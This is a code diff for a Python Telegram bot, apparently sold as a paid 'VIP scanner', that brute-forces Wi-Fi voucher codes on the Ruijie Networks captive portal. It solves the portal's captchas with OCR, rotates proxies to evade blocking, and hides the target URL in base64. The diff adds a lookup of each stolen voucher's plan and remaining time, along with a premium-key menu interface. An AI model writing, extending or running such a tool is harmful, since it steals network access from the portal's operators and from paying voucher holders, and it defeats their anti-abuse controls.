@@ -2047,7 +2047,6 @@ async def get_random_proxy_connector():
         if not available_proxies:
             dead_proxies.clear()
             available_proxies = PROXIES
-        
         proxy_url = random.choice(available_proxies) if available_proxies else None
 
     if not proxy_url:
@@ -2076,9 +2075,9 @@ _voucher_sem = None
 _start_time = time.monotonic()
 _ocr = ddddocr.DdddOcr(show_ad=False)
 
-# Web Server (For 24/7 Hosting)
+# --- WEB SERVER ---
 async def handle(request):
-    return web.Response(text="Bot is awake and running 24/7!")
+    return web.Response(text="💎 Premium Bot is awake and running 24/7!")
 
 async def web_server():
     app = web.Application()
@@ -2089,7 +2088,7 @@ async def web_server():
     site = web.TCPSite(runner, '0.0.0.0', port)
     await site.start()
 
-# --- FILE OPERATIONS (Safe Locked) ---
+# --- FILE OPERATIONS ---
 async def load_auth_list():
     global auth_list
     async with auth_lock:
@@ -2120,7 +2119,63 @@ async def save_result():
         async with aiofiles.open(RESULT_FILE, 'w') as f:
             await f.write(json.dumps(result, indent=2))
 
-# --- OCR & AUTH LOGIC ---
+# --- UTILS & HTML ESCAPE ---
+def escape_html(text):
+    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+
+def check_key_expiration(expiration_time):
+    try:
+        if isinstance(expiration_time, dict):
+            expiry = expiration_time.get("expires_at")
+            if expiry == "9999-12-31T23:59:59Z": return True
+            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
+            return datetime.now(timezone.utc) < exp_time
+        mm, hh, dd, MM, yyyy = map(int, expiration_time.split('-'))
+        expiration_dt = datetime(year=yyyy, month=MM, day=dd, hour=hh, minute=mm, second=0, tzinfo=timezone.utc)
+        return datetime.now(timezone.utc) < expiration_dt
+    except: return False
+
+def generate_expiry(plan):
+    now = datetime.now(timezone.utc)
+    plans = {
+        "30m": timedelta(minutes=30), "1h": timedelta(hours=1),
+        "1d": timedelta(days=1), "7d": timedelta(days=7),
+        "1m": timedelta(days=30), "1y": timedelta(days=365),
+        "unlimited": None
+    }
+    if plan not in plans: return None
+    if plan == "unlimited": return "9999-12-31T23:59:59Z"
+    return (now + plans[plan]).isoformat()
+
+def format_time(total_minutes):
+    if total_minutes is None: return "Unavailable"
+    try:
+        minutes = int(total_minutes)
+        if minutes <= 0: return "0 mins"
+        days, rem = minutes // 1440, minutes % 1440
+        hours, mins = rem // 60, rem % 60
+        parts = []
+        if days > 0: parts.append(f"{days}d")
+        if hours > 0: parts.append(f"{hours}h")
+        if mins > 0: parts.append(f"{mins}m")
+        return " ".join(parts)
+    except: return "Unknown"
+
+async def get_user_info(user_id):
+    try:
+        user = await bot.get_chat(user_id)
+        name = user.first_name or "Unknown"
+        if user.last_name: name += f" {user.last_name}"
+        return {"name": escape_html(name), "username": escape_html(user.username or "None"), "id": user_id}
+    except:
+        return {"name": "Unknown", "username": "None", "id": user_id}
+
+# --- UI/UX COMPONENTS ---
+def build_progress_bar(percent, length=12):
+    filled = min(length, int((percent / 100) * length))
+    return "▰" * filled + "▱" * (length - filled)
+
+# --- OCR & CAPTCHA ---
 def _ocr_sync(image_bytes):
     nparr = np.frombuffer(image_bytes, np.uint8)
     img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
@@ -2162,40 +2217,50 @@ async def get_session_id(session, session_url, previous_session_id=None):
         async with session.get(session_url, headers=headers, allow_redirects=True) as req:
             match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
             return match.group(1) if match else previous_session_id
-    except:
-        return previous_session_id
+    except: return previous_session_id
 
-# --- SCANNING ENGINE ---
-async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
-    if not recheck:
-        current_task = scan_tasks.get(chat_id)
-        if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
-            return
+async def fetch_voucher_balance_safe(session_id):
+    for _ in range(3):
+        connector, p_url = await get_random_proxy_connector()
+        try:
+            async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=15)) as session:
+                headers = {'authority': 'portal-as.ruijienetworks.com', 'user-agent': 'Mozilla/5.0'}
+                url = f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}'
+                async with session.get(url, headers=headers) as req:
+                    data = await req.json()
+                    return data.get('result', {}) or {}
+        except Exception:
+            if p_url: async with proxy_lock: dead_proxies.add(p_url)
+            continue
+    return {}
+
+# --- CORE SCAN ENGINE ---
+async def perform_check(session_url, code, chat_id, scan_id=None, message=None):
+    current_task = scan_tasks.get(chat_id)
+    if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
+        return None
 
     post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
-    response = None
+    response, session_id = None, None
 
     for attempt in range(3):
         connector, p_url = await get_random_proxy_connector()
-        timeout = aiohttp.ClientTimeout(total=20)
         try:
-            async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.CookieJar(), timeout=timeout) as session:
+            async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.CookieJar(), timeout=aiohttp.ClientTimeout(total=20)) as session:
                 session_id = await get_session_id(session, session_url)
                 if not session_id:
                     if p_url: async with proxy_lock: dead_proxies.add(p_url)
                     continue
 
                 auth_code = None
-                for _ in range(3): # Captcha retries
+                for _ in range(4):
                     try:
                         img = await Captcha_Image(session, session_id)
                         text = await Captcha_Text(img)
                         if text and await Varify_Captcha(session, session_id, text):
                             auth_code = text
                             break
-                    except Exception:
-                        pass
-                
+                    except Exception: pass
                 if not auth_code: continue
 
                 data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
@@ -2211,10 +2276,27 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
         return None
 
     if 'logonUrl' in response:
-        plan_str = "Active Plan" # Fetch actual balance if needed
+        balance_data = await fetch_voucher_balance_safe(session_id)
+        profile_name = balance_data.get('profileName', 'Unknown')
+        total_min = balance_data.get('totalMinutes', 0)
+        remain_min = balance_data.get('remainingMinutes', 0)
+
+        plan_str = f"{profile_name} (⏳ {format_time(remain_min)} left)"
         success_texts.setdefault(chat_id, []).append({"code": code, "plan": plan_str})
         found_count[chat_id] = found_count.get(chat_id, 0) + 1
         await SUCCESS_CODE.put({"chat_id": chat_id, "code": {"code": code, "plan": plan_str}})
+
+        if message:
+            try:
+                success_codes = success_texts.get(chat_id, [])
+                lines = [f"💎 <code>{c['code']}</code>\n└ 📦 <i>{c['plan']}</i>" for c in success_codes]
+                text = f"<b>🎉 SUCCESS CODES FOUND!</b>\n━━━━━━━━━━━━━━━━━━━━━\n" + "\n\n".join(lines)
+                if chat_id not in success_messages:
+                    sent = await bot.send_message(chat_id=message.chat.id, text=text, parse_mode="HTML")
+                    success_messages[chat_id] = sent.message_id
+                else:
+                    await bot.edit_message_text(chat_id=message.chat.id, message_id=success_messages[chat_id], text=text, parse_mode="HTML")
+            except Exception: pass
         return code
 
     return None
@@ -2233,43 +2315,232 @@ def iter_codes(mode):
         strings = string.ascii_lowercase + string.digits
         while True: yield "".join(random.choice(strings) for _ in range(length))
 
-async def run_bruteforce(mode, chat_id, session_url, scan_id, progress_msg):
+def format_progress_html(mode, checked, total, speed, found, retry):
+    mode_display = {"6":"6 Digits [0-9]", "7":"7 Digits [0-9]", "all6":"All Mix [A-Z0-9] (6)"}.get(mode, str(mode).upper())
+    
+    text = f"⚡ <b>ACTIVE SCANNER RUNNING</b> ⚡\n"
+    text += f"━━━━━━━━━━━━━━━━━━━━━\n"
+    text += f"🎯 <b>Target:</b> {mode_display}\n"
+    
+    if total is not None:
+        percent = (checked / total) * 100 if total > 0 else 0
+        bar = build_progress_bar(percent)
+        text += f"📊 <b>Progress:</b> <code>{bar}</code> {percent:.2f}%\n"
+        text += f"📦 <b>Checked:</b> <code>{checked:,}</code> / <code>{total:,}</code>\n"
+    else:
+        text += f"📦 <b>Checked:</b> <code>{checked:,}</code>\n"
+
+    text += f"🚀 <b>Speed:</b> <code>{speed:,.0f}</code> codes/min\n"
+    text += f"💎 <b>Hits Found:</b> <b>{found}</b>\n"
+    text += f"🔄 <b>Retries:</b> {retry}\n"
+    text += f"━━━━━━━━━━━━━━━━━━━━━\n"
+    text += f"<i>Please wait, scanning in progress...</i>"
+    
+    return text
+
+async def run_bruteforce(mode, chat_id, session_url, scan_id, message, progress_msg):
     global _voucher_sem
     if _voucher_sem is None: _voucher_sem = asyncio.Semaphore(CONCURRENCY)
     
     code_iter = iter_codes(mode)
     checked, scan_start = 0, time.monotonic()
+    total = 10 ** int(mode) if mode in ["6", "7"] else None
 
     try:
         while True:
             current_task = scan_tasks.get(chat_id)
             if not current_task or current_task.get("stop"): break
 
-            batch = [next(code_iter) for _ in range(500)]
+            batch = [next(code_iter) for _ in range(1000)]
             
             async def _check(code):
                 async with _voucher_sem:
-                    return await perform_check(session_url, code, chat_id, scan_id)
+                    return await perform_check(session_url, code, chat_id, scan_id, message=message)
 
             await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
             checked += len(batch)
 
             elapsed = time.monotonic() - scan_start
             speed = (checked / elapsed * 60) if elapsed > 0 else 0
-            text = f"🎯 Scan Type: {mode}\n📦 Checked: {checked:,}\n⚡ Speed: {speed:,.0f} codes/min\n✅ Found: {found_count.get(chat_id, 0)}\n🔄 Retry: {retry_count.get(chat_id, 0)}"
+            
+            text = format_progress_html(mode, checked, total, speed, found_count.get(chat_id, 0), retry_count.get(chat_id, 0))
+            markup = types.InlineKeyboardMarkup()
+            markup.add(types.InlineKeyboardButton("🛑 Terminate Scan", callback_data="stop_scan"))
             
             try:
-                markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🛑 Stop Scan", callback_data="stop_scan"))
-                await bot.edit_message_text(text, chat_id=chat_id, message_id=progress_msg.message_id, reply_markup=markup)
-            except Exception:
-                pass
+                await bot.edit_message_text(text, chat_id=chat_id, message_id=progress_msg.message_id, reply_markup=markup, parse_mode="HTML")
+            except Exception: pass
     finally:
         scan_tasks.pop(chat_id, None)
 
-# --- BACKGROUND TASKS ---
+# --- MENUS AND COMMANDS (PREMIUM UI) ---
+async def send_main_menu(message):
+    user_info = await get_user_info(message.chat.id)
+    chat_id = str(message.chat.id)
+    
+    is_admin = (chat_id == ADMIN_ID)
+    has_key = is_admin or (chat_id in auth_list)
+    
+    status_text = "👑 <b>Premium User</b>" if has_key else "❌ <b>Free / Unpaid User</b>"
+    
+    used_codes = len(result.get(chat_id, []))
+    limit_text = "<code>Unlimited</code>"
+    if has_key and not is_admin:
+        k_limit = auth_list[chat_id].get("limit", "unlimited")
+        limit_text = f"<code>{used_codes}/{k_limit}</code>" if str(k_limit) != "unlimited" else "<code>Unlimited</code>"
+
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    # Primary action (Full width)
+    markup.add(types.InlineKeyboardButton("🚀 START VIP SCANNER 🚀", callback_data="scan_type_menu"))
+    # Secondary actions (Half width)
+    markup.add(
+        types.InlineKeyboardButton("🔗 Set URL", callback_data="input_url"),
+        types.InlineKeyboardButton("📂 My Results", callback_data="result")
+    )
+    markup.add(
+        types.InlineKeyboardButton("📊 System Status", callback_data="status"),
+        types.InlineKeyboardButton("🛑 Stop Scan", callback_data="stop_scan")
+    )
+    if is_admin:
+        markup.add(types.InlineKeyboardButton("🛠️ Admin Dashboard", callback_data="admin_menu"))
+
+    proxy_st = "🟢 Active" if PROXY_ENABLED else "🔴 Offline"
+
+    welcome_text = (
+        f"<b>💎 STARLINK VIP SCANNER 💎</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👤 <b>Account Details</b>\n"
+        f"├ <b>Name:</b> {user_info['name']}\n"
+        f"├ <b>ID:</b> <code>{user_info['id']}</code>\n"
+        f"└ <b>Status:</b> {status_text}\n\n"
+        f"⚙️ <b>System Overview</b>\n"
+        f"├ <b>Proxy Shield:</b> {proxy_st}\n"
+        f"└ <b>Code Usage:</b> {limit_text}\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👇 <i>Please select an option below:</i>"
+    )
+    await bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="HTML")
+
+async def send_admin_menu(message):
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("🔑 Gen Key", callback_data="genkey_menu"),
+        types.InlineKeyboardButton("📋 List Keys", callback_data="listkeys")
+    )
+    markup.add(
+        types.InlineKeyboardButton("📊 Status", callback_data="status"),
+        types.InlineKeyboardButton("📢 Broadcast", callback_data="broadcast_menu")
+    )
+    markup.add(types.InlineKeyboardButton("🏠 Back to Home", callback_data="main_menu"))
+    
+    text = "🛠️ <b>ADMINISTRATION DASHBOARD</b> 🛠️\n━━━━━━━━━━━━━━━━━━━━━\n👇 <i>Select an administrative action:</i>"
+    try:
+        await bot.edit_message_text(text, chat_id=message.chat.id, message_id=message.message_id, reply_markup=markup, parse_mode="HTML")
+    except:
+        await bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="HTML")
+
+@bot.message_handler(commands=['start', 'key'])
+async def handle_key(message):
+    chat_id = str(message.chat.id)
+    if chat_id == ADMIN_ID:
+        await send_main_menu(message)
+        return
+    await load_auth_list()
+    if chat_id in auth_list and check_key_expiration(auth_list[chat_id]):
+        await send_main_menu(message)
+    else:
+        await bot.reply_to(message, f"❌ <b>Access Denied!</b>\nYou do not have a valid Premium Key. Please contact {ADMIN_CONTACT}.", parse_mode="HTML")
+
+@bot.message_handler(commands=['input'])
+async def handle_input(message):
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2:
+        await bot.reply_to(message, "⚠️ <b>Usage:</b>\n<code>/input https://portal-as.ruijie...</code>", parse_mode="HTML")
+        return
+    user_data.setdefault(message.chat.id, {})['session_url'] = args[1]
+    
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("🔢 6 Digits", callback_data="scan_type_6"),
+        types.InlineKeyboardButton("🔢 7 Digits", callback_data="scan_type_7"),
+        types.InlineKeyboardButton("🔤 All Mix (6)", callback_data="scan_type_all6"),
+        types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")
+    )
+    await bot.send_message(message.chat.id, "✅ <b>SESSION SECURELY SAVED!</b>\n\n👇 <i>Choose your scanning target:</i>", reply_markup=markup, parse_mode="HTML")
+
+async def trigger_scan(message, mode):
+    chat_id = message.chat.id
+    if str(chat_id) != ADMIN_ID and (str(chat_id) not in auth_list or not check_key_expiration(auth_list[str(chat_id)])):
+        await bot.send_message(chat_id, "❌ <b>Access Denied!</b>", parse_mode="HTML")
+        return
+    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
+        await bot.send_message(chat_id, "❌ <b>No Session URL Found.</b>\nPlease use <code>/input &lt;URL&gt;</code> first.", parse_mode="HTML")
+        return
+    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
+        await bot.send_message(chat_id, "⚠️ <b>A scan is already running!</b>", parse_mode="HTML")
+        return
+
+    found_count[chat_id] = 0
+    retry_count[chat_id] = 0
+    success_texts[chat_id] = []
+    
+    markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🛑 Terminate Scan", callback_data="stop_scan"))
+    progress_msg = await bot.send_message(chat_id, f"⚙️ <b>Initializing Engine...</b>\nTarget: {mode}", reply_markup=markup, parse_mode="HTML")
+
+    scan_id = str(uuid.uuid4())
+    task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message, progress_msg))
+    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
+
+@bot.callback_query_handler(func=lambda call: True)
+async def callback_query(call):
+    data = call.data
+    chat_id = call.message.chat.id
+    if data == "main_menu":
+        await send_main_menu(call.message)
+    elif data == "scan_type_menu":
+        markup = types.InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            types.InlineKeyboardButton("🔢 6 Digits", callback_data="scan_type_6"),
+            types.InlineKeyboardButton("🔢 7 Digits", callback_data="scan_type_7"),
+            types.InlineKeyboardButton("🔤 Mix 6 (A-Z,0-9)", callback_data="scan_type_all6"),
+            types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")
+        )
+        await bot.edit_message_text("🎯 <b>Select Scan Target:</b>", chat_id=chat_id, message_id=call.message.message_id, reply_markup=markup, parse_mode="HTML")
+    elif data.startswith("scan_type_"):
+        mode = data.replace("scan_type_", "")
+        await trigger_scan(call.message, mode)
+    elif data == "stop_scan":
+        current_task = scan_tasks.get(chat_id)
+        if current_task and not current_task["task"].done():
+            current_task["stop"] = True
+            current_task["task"].cancel()
+            await bot.send_message(chat_id, "🛑 <b>Scan Process Terminated Successfully.</b>", parse_mode="HTML")
+        else:
+            await bot.send_message(chat_id, "⚠️ <b>No active scan running.</b>", parse_mode="HTML")
+    elif data == "result":
+        await load_result()
+        if chat_id in result and result[str(chat_id)]:
+            codes = [f"💎 <code>{c['code']}</code>\n└ 📦 <i>{c['plan']}</i>" if isinstance(c, dict) else f"💎 <code>{c}</code>" for c in result[str(chat_id)]]
+            await bot.send_message(chat_id, "<b>🎉 YOUR HITS (SUCCESS CODES):</b>\n━━━━━━━━━━━━━━━━━━━━━\n" + "\n\n".join(codes), parse_mode="HTML")
+        else:
+            await bot.send_message(chat_id, "📭 <b>No hits found yet.</b> Keep scanning!", parse_mode="HTML")
+    elif data == "input_url":
+        await bot.send_message(chat_id, "📝 <b>Please provide your Session URL.</b>\n\nSend a message like this:\n<code>/input https://portal-as...</code>", parse_mode="HTML")
+    elif data == "admin_menu":
+        await send_admin_menu(call.message)
+    elif data == "status":
+        active_scans = sum(1 for d in scan_tasks.values() if not d["task"].done())
+        uptime = int(time.monotonic() - _start_time)
+        hrs, rem = divmod(uptime, 3600)
+        mins, _ = divmod(rem, 60)
+        st = f"📊 <b>SYSTEM STATUS</b>\n━━━━━━━━━━━━━━━━━━━━━\n├ ⏱ <b>Uptime:</b> {hrs}h {mins}m\n├ 🔍 <b>Active Scans:</b> {active_scans}\n├ 🔑 <b>Total Keys:</b> {len(auth_list)}\n└ 🛡️ <b>Proxies:</b> {len(PROXIES)-len(dead_proxies)}/{len(PROXIES)}"
+        await bot.send_message(chat_id, st, parse_mode="HTML")
+    await bot.answer_callback_query(call.id)
+
+# --- BACKGROUND & MAIN ---
 async def periodic_result_saver():
     while True:
-        await asyncio.sleep(60) # Saving every 60s
+        await asyncio.sleep(60)
         items = []
         while not SUCCESS_CODE.empty(): items.append(await SUCCESS_CODE.get())
         if items:
